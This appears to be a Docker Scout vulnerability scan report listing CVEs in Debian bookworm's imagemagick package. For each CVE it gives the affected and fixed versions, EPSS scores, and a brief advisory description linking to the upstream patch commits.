<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 7" src="https://img.shields.io/badge/H-7-e25d68"/> <img alt="medium: 14" src="https://img.shields.io/badge/M-14-fbb552"/> <img alt="low: 16" src="https://img.shields.io/badge/L-16-fce1a9"/> <!-- unspecified: 0 --><strong>imagemagick</strong> <code>8:6.9.11.60+dfsg-1.6</code> (deb)</summary>

<small><code>pkg:deb/debian/imagemagick@8%3A6.9.11.60%2Bdfsg-1.6?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-55154?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u4"><img alt="high : CVE--2025--55154" src="https://img.shields.io/badge/CVE--2025--55154-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><8:6.9.11.60+dfsg-1.6+deb12u4</code></td></tr>
<tr><td>Fixed version</td><td><code>8:6.9.11.60+dfsg-1.6+deb12u4</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.047%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to versions 6.9.13-27 and 7.1.2-1, the magnified size calculations in ReadOneMNGIMage (in coders/png.c) are unsafe and can overflow, leading to memory corruption. This issue has been patched in versions 6.9.13-27 and 7.1.2-1.

---
- imagemagick 8:7.1.2.1+dfsg1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1111103)
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-qp29-wxp5-wh82
https://github.com/ImageMagick/ImageMagick/commit/db986e4782e9f6cc42a0e50151dc4fe43641b337 (7.1.2-1)
https://github.com/ImageMagick/ImageMagick6/commit/14234b2d3be45af1f71ffafd260532bbd8f81d39 (6.9.13-27)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-23876?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u5"><img alt="high : CVE--2026--23876" src="https://img.shields.io/badge/CVE--2026--23876-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><=8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.043%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>13th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to versions 7.1.2-13 and 6.9.13-38, a heap buffer overflow vulnerability in the XBM image decoder (ReadXBMImage) allows an attacker to write controlled data past the allocated heap buffer when processing a maliciously crafted image file. Any operation that reads or identifies an image can trigger the overflow, making it exploitable via common image upload and processing pipelines. Versions 7.1.2-13 and 6.9.13-38 fix the issue.

---
- imagemagick 8:7.1.2.13+dfsg1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1126076)
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-r49w-jqq3-3gx8
Fixed by: https://github.com/ImageMagick/ImageMagick/commit/2fae24192b78fdfdd27d766fd21d90aeac6ea8b8 (7.1.2-13)
Fixed by: https://github.com/ImageMagick/ImageMagick6/commit/536512a2c60cd6e8c21c1256c2ee4da48d903e0c (6.9.13-38)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-66628?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u5"><img alt="high : CVE--2025--66628" src="https://img.shields.io/badge/CVE--2025--66628-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.055%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>17th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is a software suite to create, edit, compose, or convert bitmap images. In versions 7.1.2-9 and prior, the TIM (PSX TIM) image parser contains a critical integer overflow vulnerability in its ReadTIMImage function (coders/tim.c). The code reads width and height (16-bit values) from the file header and calculates image_size = 2 * width * height without checking for overflow. On 32-bit systems (or where size_t is 32-bit), this calculation can overflow if width and height are large (e.g., 65535), wrapping around to a small value. This results in a small heap allocation via AcquireQuantumMemory and later operations relying on the dimensions can trigger an out of bounds read. This issue is fixed in version 7.1.2-10.

---
- imagemagick 8:7.1.2.12+dfsg1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1122584)
[trixie] - imagemagick 8:7.1.1.43+dfsg1-1+deb13u4
[bookworm] - imagemagick 8:6.9.11.60+dfsg-1.6+deb12u5
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-6hjr-v6g4-3fm8
Fixed by: https://github.com/ImageMagick/ImageMagick/commit/bdae0681ad1e572defe62df85834218f01e6d670 (7.1.2-10)
Fixed by: https://github.com/ImageMagick/ImageMagick6/commit/7779f1ff772dfabe545c67fb2f3bfa8f7a845a2d (6.9.13-35)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-57803?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u4"><img alt="high : CVE--2025--57803" src="https://img.shields.io/badge/CVE--2025--57803-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><8:6.9.11.60+dfsg-1.6+deb12u4</code></td></tr>
<tr><td>Fixed version</td><td><code>8:6.9.11.60+dfsg-1.6+deb12u4</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.087%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to versions 6.9.13-28 and 7.1.2-2 for ImageMagick's 32-bit build, a 32-bit integer overflow in the BMP encoder’s scanline-stride computation collapses bytes_per_line (stride) to a tiny value while the per-row writer still emits 3 × width bytes for 24-bpp images. The row base pointer advances using the (overflowed) stride, so the first row immediately writes past its slot and into adjacent heap memory with attacker-controlled bytes. This is a classic, powerful primitive for heap corruption in common auto-convert pipelines. This issue has been patched in versions 6.9.13-28 and 7.1.2-2.

---
- imagemagick 8:7.1.2.3+dfsg1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1112469)
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-mxvv-97wh-cfmm
https://github.com/ImageMagick/ImageMagick/commit/2c55221f4d38193adcb51056c14cf238fbcc35d7 (7.1.2-2)
https://github.com/ImageMagick/ImageMagick6/commit/e49c68c88eed6e68145480a471650daa9ed87217 (6.9.13-28)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-55298?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u4"><img alt="high : CVE--2025--55298" src="https://img.shields.io/badge/CVE--2025--55298-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><8:6.9.11.60+dfsg-1.6+deb12u4</code></td></tr>
<tr><td>Fixed version</td><td><code>8:6.9.11.60+dfsg-1.6+deb12u4</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.500%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>65th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to ImageMagick versions 6.9.13-28 and 7.1.2-2, a format string bug vulnerability exists in InterpretImageFilename function where user input is directly passed to FormatLocaleString without proper sanitization. An attacker can overwrite arbitrary memory regions, enabling a wide range of attacks from heap overflow to remote code execution. This issue has been patched in versions 6.9.13-28 and 7.1.2-2.

---
- imagemagick 8:7.1.2.3+dfsg1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1111586)
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-9ccg-6pjw-x645
Fixed by [1/2]: https://github.com/ImageMagick/ImageMagick/commit/1f93323df9d8c011c31bc4c6880390071f7fb895 (7.1.2-2)
Fixed by [2/2]: https://github.com/ImageMagick/ImageMagick/commit/439b362b93c074eea6c3f834d84982b43ef057d5 (7.1.2-2)
Fixed by: https://github.com/ImageMagick/ImageMagick6/commit/731ce3a7aa7fabebaa322711c04ce5f5cf22edf4 (6.9.13-28)
Fixed by: https://github.com/ImageMagick/ImageMagick6/commit/d789bdf7aabb955b88fbc95653aa9dbf6c5d259f (6.9.13-28)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-3610?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u1"><img alt="high : CVE--2021--3610" src="https://img.shields.io/badge/CVE--2021--3610-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><8:6.9.11.60+dfsg-1.6+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>8:6.9.11.60+dfsg-1.6+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.147%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>36th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A heap-based buffer overflow vulnerability was found in ImageMagick in versions prior to 7.0.11-14 in ReadTIFFImage() in coders/tiff.c. This issue is due to an incorrect setting of the pixel array size, which can lead to a crash and segmentation fault.

---
[experimental] - imagemagick 8:6.9.12.20+dfsg1-1
- imagemagick 8:6.9.12.98+dfsg1-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1037090)
[buster] - imagemagick <not-affected> (Vulnerable code introduced later)
https://github.com/ImageMagick/ImageMagick/commit/930ff0d1a9bc42925a7856e9ea53f5fc9f318bf3
ImageMagick6 prerequisite for <= 6.9.10-92: https://github.com/ImageMagick/ImageMagick6/commit/2d96228eec9fbea62ddb6c1450fa8d43e2c6b68a
ImageMagick6 prerequisite for <= 6.9.11-10: https://github.com/ImageMagick/ImageMagick6/commit/7374894385161859ffbb84e280fcc89e7ae257e4
ImageMagick6 prerequisite for <= 6.9.11-54: https://github.com/ImageMagick/ImageMagick6/commit/cdb67005376bcc8cbb0b743fb22787794cd30ebc
ImageMagick6 [1/2]: https://github.com/ImageMagick/ImageMagick6/commit/b307bcadcdf6ea6819951ac1786b7904f27b25c6 (6.9.12-14)
ImageMagick6 [2/2]: https://github.com/ImageMagick/ImageMagick6/commit/c75ae771a00c38b757c5ef4b424b51e761b02552 (6.9.12-14)
Introduced by (Support 32-bit tiles TIFF images): https://github.com/ImageMagick/ImageMagick6/commit/b874d50070557eb98bdc6a3095ef4769af583dd2 (6.9.10-88)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-53101?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u4"><img alt="high : CVE--2025--53101" src="https://img.shields.io/badge/CVE--2025--53101-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><8:6.9.11.60+dfsg-1.6+deb12u4</code></td></tr>
<tr><td>Fixed version</td><td><code>8:6.9.11.60+dfsg-1.6+deb12u4</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.064%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>20th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. In versions prior to 7.1.2-0 and 6.9.13-26, in ImageMagick's `magick mogrify` command, specifying multiple consecutive `%d` format specifiers in a filename template causes internal pointer arithmetic to generate an address below the beginning of the stack buffer, resulting in a stack overflow through `vsnprintf()`. Versions 7.1.2-0 and 6.9.13-26 fix the issue.

---
- imagemagick 8:7.1.1.47+dfsg1-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1109339)
[trixie] - imagemagick 8:7.1.1.43+dfsg1-1+deb13u1
[bookworm] - imagemagick 8:6.9.11.60+dfsg-1.6+deb12u4
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-qh3h-j545-h8c9
https://github.com/ImageMagick/ImageMagick/commit/66dc8f51c11b0ae1f1cdeacd381c3e9a4de69774 (7.1.2-0)
https://github.com/ImageMagick/ImageMagick6/commit/643deeb60803488373cd4799b24d5786af90972e (6.9.13-26)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-23952?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u5"><img alt="medium : CVE--2026--23952" src="https://img.shields.io/badge/CVE--2026--23952-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><=8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Versions 14.10.1 and below have a NULL pointer dereference vulnerability in the MSL (Magick Scripting Language) parser when processing <comment> tags before images are loaded. This can lead to DoS attack due to assertion failure (debug builds) or NULL pointer dereference (release builds). This issue is fixed in version 14.10.2.

---
- imagemagick 8:7.1.2.13+dfsg1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1126077)
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-5vx3-wx4q-6cj8
Fixed by: https://github.com/ImageMagick/ImageMagick/commit/1eefab41bc0ab1c6c2c1fd3e4a49e3ee1849751d (7.1.2-13)
Fixed by: https://github.com/ImageMagick/ImageMagick6/commit/0e4023775c8859d2b802e8b459a27b599ca8403a (6.9.13-38)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-5341?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u1"><img alt="medium : CVE--2023--5341" src="https://img.shields.io/badge/CVE--2023--5341-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><8:6.9.11.60+dfsg-1.6+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>8:6.9.11.60+dfsg-1.6+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.036%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>10th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A heap use-after-free flaw was found in coders/bmp.c in ImageMagick.

---
- imagemagick 8:6.9.12.98+dfsg1-2
https://github.com/ImageMagick/ImageMagick/commit/aa673b2e4defc7cad5bec16c4fc8324f71e531f1 (7.1.1-19)
https://github.com/ImageMagick/ImageMagick6/commit/405684654eb9b43424c3c0276ea343681021d9e0 (6.9.12-97)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-3428?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u1"><img alt="medium : CVE--2023--3428" src="https://img.shields.io/badge/CVE--2023--3428-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><8:6.9.11.60+dfsg-1.6+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>8:6.9.11.60+dfsg-1.6+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.023%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A heap-based buffer overflow vulnerability was found  in coders/tiff.c in ImageMagick. This issue may allow a local attacker to trick the user into opening a specially crafted file, resulting in an application crash and denial of service.

---
[experimental] - imagemagick 8:6.9.12.98+dfsg1-1
- imagemagick 8:6.9.12.98+dfsg1-2
[buster] - imagemagick <not-affected> (code is introduced later)
Fixed by: https://github.com/ImageMagick/ImageMagick/commit/a531d28e31309676ce8168c3b6dbbb5374b78790 (7.1.1-13)
Prerequisite: https://github.com/ImageMagick/ImageMagick6/commit/2b4eabb9d09b278f16727c635e928bd951c58773 (6.9.12-55)
Fixed by: https://github.com/ImageMagick/ImageMagick6/commit/0d00400727170b0540a355a1bc52787bc7bcdea5 (6.9.12-91)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-62171?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u5"><img alt="medium : CVE--2025--62171" src="https://img.shields.io/badge/CVE--2025--62171-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.095%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>27th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is an open source software suite for displaying, converting, and editing raster image files. In ImageMagick versions prior to 7.1.2-7 and 6.9.13-32, an integer overflow vulnerability exists in the BMP decoder on 32-bit systems. The vulnerability occurs in coders/bmp.c when calculating the extent value by multiplying image columns by bits per pixel. On 32-bit systems with size_t of 4 bytes, a malicious BMP file with specific dimensions can cause this multiplication to overflow and wrap to zero. The overflow check added to address CVE-2025-57803 is placed after the overflow occurs, making it ineffective. A specially crafted 58-byte BMP file with width set to 536,870,912 and 32 bits per pixel can trigger this overflow, causing the bytes_per_line calculation to become zero. This vulnerability only affects 32-bit builds of ImageMagick where default resource limits for width, height, and area have been manually increased beyond their defaults. 64-bit systems with size_t of 8 bytes are not vulnerable, and systems using default ImageMagick resource limits are not vulnerable. The vulnerability is fixed in versions 7.1.2-7 and 6.9.13-32.

---
- imagemagick 8:7.1.2.7+dfsg1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1118340)
[trixie] - imagemagick 8:7.1.1.43+dfsg1-1+deb13u3
[bookworm] - imagemagick 8:6.9.11.60+dfsg-1.6+deb12u5
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-9pp9-cfwx-54rm
Fixed by: https://github.com/ImageMagick/ImageMagick/commit/cea1693e2ded51b4cc91c70c54096cbed1691c00 (7.1.2-7)
Fixed by: https://github.com/ImageMagick/ImageMagick6/commit/456771fae8baa9558a1421ec8d522e6937d9b2d7 (6.9.13-32)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-23874?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u5"><img alt="medium : CVE--2026--23874" src="https://img.shields.io/badge/CVE--2026--23874-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><=8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.013%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Versions prior to 7.1.2-13 have a stack overflow via infinite recursion in MSL (Magick Scripting Language) `<write>` command when writing to MSL format. Version 7.1.2-13 fixes the issue.

---
- imagemagick 8:7.1.2.13+dfsg1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1126075)
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-9vj4-wc7r-p844
Fixed by: https://github.com/ImageMagick/ImageMagick/commit/2a09644b10a5b146e0a7c63b778bd74a112ebec3 (7.1.2-13)
Fixed by: https://github.com/ImageMagick/ImageMagick6/commit/fe2970bbbe02c6fe875cc2b269390a3165d57706 (6.9.13-38)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-34151?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u1"><img alt="medium : CVE--2023--34151" src="https://img.shields.io/badge/CVE--2023--34151-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><8:6.9.11.60+dfsg-1.6+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>8:6.9.11.60+dfsg-1.6+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.064%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>20th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in ImageMagick. This security flaw ouccers as an undefined behaviors of casting double to size_t in svg, mvg and other coders (recurring bugs of CVE-2022-32546).

---
- imagemagick 8:6.9.12.98+dfsg1-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1036999)
https://github.com/ImageMagick/ImageMagick/issues/6341
ImageMagick: https://github.com/ImageMagick/ImageMagick/commit/3d6d98d8a2be30d74172ab43b5b8e874d2deb158 (7.1.1-10)
Vulnerability was incomplete and fixed across multiple version by upstream
[1/9] https://github.com/ImageMagick/ImageMagick6/commit/be15ac962dea19536be1009d157639030fc42be9
[2/9] https://github.com/ImageMagick/ImageMagick6/commit/8b7b17c8fef72dab479e6ca676676d8c5e395dd6
[3/9] https://github.com/ImageMagick/ImageMagick6/commit/c5a9368d871943eceafce143bb87612b2a9623b2
[4/9] https://github.com/ImageMagick/ImageMagick6/commit/c5a9368d871943eceafce143bb87612b2a9623b2
[5/9] https://github.com/ImageMagick/ImageMagick6/commit/75ebd9975f6ba8106ec15a6b3e6ba95f4c14e117
[6/9] https://github.com/ImageMagick/ImageMagick6/commit/b72508c8fce196cd031856574c202490be830649
[7/9] https://github.com/ImageMagick/ImageMagick6/commit/88789966667b748f14a904f8c9122274810e8a3e
[8/9] https://github.com/ImageMagick/ImageMagick6/commit/bc5ac19bd93895e5c6158aad0d8e49a0c50b0ebb
[9/9] https://github.com/ImageMagick/ImageMagick6/commit/3252d4771ff1142888ba83c439588969fcea98e4

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-1906?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u1"><img alt="medium : CVE--2023--1906" src="https://img.shields.io/badge/CVE--2023--1906-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><8:6.9.11.60+dfsg-1.6+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>8:6.9.11.60+dfsg-1.6+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.029%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A heap-based buffer overflow issue was discovered in ImageMagick's ImportMultiSpectralQuantum() function in MagickCore/quantum-import.c. An attacker could pass specially crafted file to convert, triggering an out-of-bounds read error, allowing an application to crash, resulting in a denial of service.

---
- imagemagick 8:6.9.12.98+dfsg1-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1034373)
[buster] - imagemagick <not-affected> (Vulnerable code introduced later)
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-35q2-86c7-9247
https://github.com/ImageMagick/ImageMagick6/commit/e30c693b37c3b41723f1469d1226a2c814ca443d (ImageMagick 6.9.12-84)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-1289?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u1"><img alt="medium : CVE--2023--1289" src="https://img.shields.io/badge/CVE--2023--1289-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><8:6.9.11.60+dfsg-1.6+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>8:6.9.11.60+dfsg-1.6+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.138%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>34th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was discovered in ImageMagick where a specially created SVG file loads itself and causes a segmentation fault. This flaw allows a remote attacker to pass a specially crafted SVG file that leads to a segmentation fault, generating many trash files in "/tmp," resulting in a denial of service. When ImageMagick crashes, it generates a lot of trash files. These trash files can be large if the SVG file contains many render actions. In a denial of service attack, if a remote attacker uploads an SVG file of size t, ImageMagick generates files of size 103*t. If an attacker uploads a 100M SVG, the server will generate about 10G.

---
- imagemagick 8:6.9.12.98+dfsg1-2
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-j96m-mjp6-99xr
https://github.com/ImageMagick/ImageMagick/commit/c5b23cbf2119540725e6dc81f4deb25798ead6a4 (7.1.1-0)
Multiple regression or incomplete fixes were identified, and a few upstream version are incomplete
[1/9] https://github.com/ImageMagick/ImageMagick6/commit/e8c0090c6d2df7b1553053dca2008e96724204bf
[2/9] https://github.com/ImageMagick/ImageMagick6/commit/706d381b7eb79927d328c96f7b7faab5dc109368
[3/9] https://github.com/ImageMagick/ImageMagick6/commit/ddc718eaa93767ceae286e171296b5fbb0bbd812
[4/9] https://github.com/ImageMagick/ImageMagick6/commit/1485a4c2cba8ca32981016fa25e7a15ef84f06f6
[5/9] https://github.com/ImageMagick/ImageMagick6/commit/84ec30550c3146f525383f18a786a6bbd5028a93
[6/9] https://github.com/ImageMagick/ImageMagick6/commit/4dd4d0df449acb13fb859041b4996af58243e352
[7/9] https://github.com/ImageMagick/ImageMagick6/commit/f4529c0dcf3a8f96c438086b28fbef8338cda0b1
[8/9] https://github.com/ImageMagick/ImageMagick6/commit/75aac79108af0c0b0d7fc88b1f09c340b0d62c85
[9/9] https://github.com/ImageMagick/ImageMagick6/commit/060660bf45e0771cf0431e5c2749aa51fabf23f8

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-3213?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u1"><img alt="medium : CVE--2022--3213" src="https://img.shields.io/badge/CVE--2022--3213-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><8:6.9.11.60+dfsg-1.6+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>8:6.9.11.60+dfsg-1.6+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.031%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A heap buffer overflow issue was found in ImageMagick. When an application processes a malformed TIFF file, it could lead to undefined behavior or a crash causing a denial of service.

---
- imagemagick 8:6.9.12.98+dfsg1-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1021141)
[bookworm] - imagemagick 8:6.9.11.60+dfsg-1.6+deb12u1
[bullseye] - imagemagick 8:6.9.11.60+dfsg-1.3+deb11u3
[buster] - imagemagick <not-affected> (Vulnerable code was introduced later)
https://bugzilla.redhat.com/show_bug.cgi?id=2126824
https://github.com/ImageMagick/ImageMagick/commit/30ccf9a0da1f47161b5935a95be854fe84e6c2a2
https://github.com/ImageMagick/ImageMagick6/commit/1aea203eb36409ce6903b9e41fe7cb70030e8750 (6.9.12-62)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-1115?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u1"><img alt="medium : CVE--2022--1115" src="https://img.shields.io/badge/CVE--2022--1115-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><8:6.9.11.60+dfsg-1.6+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>8:6.9.11.60+dfsg-1.6+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.035%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>10th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A heap-buffer-overflow flaw was found in ImageMagick’s PushShortPixel() function of quantum-private.h file. This vulnerability is triggered when an attacker passes a specially crafted TIFF image file to ImageMagick for conversion, potentially leading to a denial of service.

---
- imagemagick 8:6.9.12.98+dfsg1-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1013282)
[buster] - imagemagick <not-affected> (code is introduced later)
[stretch] - imagemagick <not-affected> (code is introduced later)
https://github.com/ImageMagick/ImageMagick/issues/4974
Fixed by: https://github.com/ImageMagick/ImageMagick6/commit/1f860f52bd8d58737ad883072203391096b30b51 (6.9.12-44)
Introduced by (Support 32-bit tiles TIFF images): https://github.com/ImageMagick/ImageMagick6/commit/b874d50070557eb98bdc6a3095ef476 (6.9.10-88)

</blockquote>
</details>

